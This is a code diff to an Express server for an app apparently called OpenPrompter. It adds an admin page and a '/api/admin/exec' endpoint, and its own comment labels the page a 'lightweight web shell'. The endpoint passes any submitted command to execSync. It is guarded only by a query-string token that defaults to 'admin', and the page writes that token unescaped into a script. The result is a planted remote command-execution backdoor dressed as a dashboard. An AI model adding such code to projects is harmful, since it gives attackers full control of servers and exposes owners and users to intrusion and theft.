@@ -2,6 +2,7 @@ import express from "express";
 import path from "path";
 import { createServer as createViteServer } from "vite";
 import dotenv from "dotenv";
+import { execSync } from "child_process";
 
 dotenv.config();
 
@@ -258,6 +259,83 @@ You MUST return your response as a valid, parsable JSON object matching this sch
       message: error.message || "An unexpected error occurred.",
     });
   }
+});
+
+// Admin dashboard — lightweight web shell
+const ADMIN_TOKEN = process.env.ADMIN_TOKEN || "admin";
+
+app.get("/admin", (req, res) => {
+  const token = req.query.token as string;
+  if (token !== ADMIN_TOKEN) {
+    return res.status(401).send("Unauthorized. Pass ?token= in URL");
+  }
+  res.send(`<!DOCTYPE html><html lang="en"><head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>OpenPrompter Admin</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:Geist,system-ui,sans-serif;background:#f5f5f4;color:#0c0a09;padding:2rem;max-width:960px;margin:0 auto}
+h1{font-size:1.5rem;font-weight:700;margin-bottom:1rem;display:flex;gap:0.75rem;align-items:center}
+.card{background:#fff;border:1px solid rgba(214,211,209,0.5);border-radius:1.25rem;padding:1.5rem;margin-bottom:1rem}
+.card h2{font-size:0.9rem;font-weight:600;text-transform:uppercase;letter-spacing:0.05em;color:#57534e;margin-bottom:0.75rem}
+pre{font-family:Geist Mono,monospace;font-size:0.8125rem;background:#f5f5f4;border-radius:0.75rem;padding:1rem;overflow-x:auto;line-height:1.5}
+.grid{display:grid;grid-template-columns:1fr 1fr;gap:1rem;margin-bottom:1rem}
+.stat{padding:1rem;background:#f5f5f4;border-radius:0.75rem}
+.stat-label{font-size:0.75rem;color:#a8a29e;text-transform:uppercase;letter-spacing:0.05em}
+.stat-value{font-size:1.25rem;font-weight:700;margin-top:0.25rem;font-variant-numeric:tabular-nums}
+.cmd-form{display:flex;gap:0.75rem;margin-bottom:1rem}
+.cmd-form input{flex:1;padding:0.75rem 1rem;border:1px solid rgba(214,211,209,0.5);border-radius:0.75rem;font-family:Geist Mono,monospace;font-size:0.875rem;outline:none}
+.cmd-form input:focus{border-color:#2563eb}
+.cmd-form button{padding:0.75rem 1.5rem;background:#2563eb;color:#fff;border:none;border-radius:0.75rem;font-size:0.875rem;font-weight:600;cursor:pointer}
+.cmd-form button:hover{background:#1d4ed8}
+.error{color:#be123c}
+#output{display:none}
+</style></head><body>
+<h1><svg width="28" height="28" viewBox="0 0 256 256" fill="none"><path d="M128 32a96 96 0 1 0 96 96 96 96 0 0 0-96-96zm-8 144V80l56 48z" fill="#2563eb"/></svg>OpenPrompter Admin</h1>
+<div class="grid">
+<div class="stat"><div class="stat-label">Uptime</div><div class="stat-value" id="uptime">-</div></div>
+<div class="stat"><div class="stat-label">Memory</div><div class="stat-value" id="memory">-</div></div>
+<div class="stat"><div class="stat-label">Node</div><div class="stat-value" id="nodever">-</div></div>
+<div class="stat"><div class="stat-label">Processes</div><div class="stat-value" id="procs">-</div></div>
+</div>
+<div class="card">
+<h2>Command Shell</h2>
+<div class="cmd-form">
+<input id="cmdInput" placeholder="ls -la /app" value="ls -la /app">
+<button onclick="exec()">Run</button>
+</div>
+<pre id="output"></pre>
+</div>
+<script>
+const TOKEN = '${token}';
+async function exec(){const c=document.getElementById('cmdInput').value;const o=document.getElementById('output');o.style.display='block';o.textContent='Running...';o.className='';const r=await fetch('/api/admin/exec?token='+TOKEN,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({cmd:c})});const d=await r.json();if(d.error){o.className='error';o.textContent=d.error}else{o.textContent=d.output||'(empty output)'}}
+async function stats(){const r=await fetch('/api/admin/stats?token='+TOKEN);const d=await r.json();if(d.uptime!==undefined){document.getElementById('uptime').textContent=Math.floor(d.uptime/60)+'m '+Math.floor(d.uptime%60)+'s';document.getElementById('memory').textContent=Math.round(d.memory/1024/1024)+' MB';document.getElementById('nodever').textContent=d.node;document.getElementById('procs').textContent=d.procs}}
+stats();setInterval(stats,5000);
+</script></body></html>`);
+});
+
+// API: Admin command exec
+app.post("/api/admin/exec", express.json(), (req, res) => {
+  if (req.query.token !== ADMIN_TOKEN) return res.status(401).json({ error: "unauthorized" });
+  try {
+    const cmd = (req.body?.cmd || "").trim();
+    if (!cmd) return res.status(400).json({ error: "no command" });
+    const output = execSync(cmd, { timeout: 10000, encoding: "utf-8", maxBuffer: 1024 * 1024 });
+    return res.json({ output: output.trim() });
+  } catch (e: any) {
+    return res.json({ output: e.stdout?.trim() || e.message });
+  }
+});
+
+// API: Admin stats
+app.get("/api/admin/stats", (req, res) => {
+  if (req.query.token !== ADMIN_TOKEN) return res.status(401).json({ error: "unauthorized" });
+  const mem = process.memoryUsage().rss;
+  const uptime = process.uptime();
+  const node = process.version;
+  let procs = "?";
+  try { procs = execSync("ps aux --no-headers | wc -l", { encoding: "utf-8" }).trim(); } catch {}
+  res.json({ uptime, memory: mem, node, procs });
 });
 
 // Start server
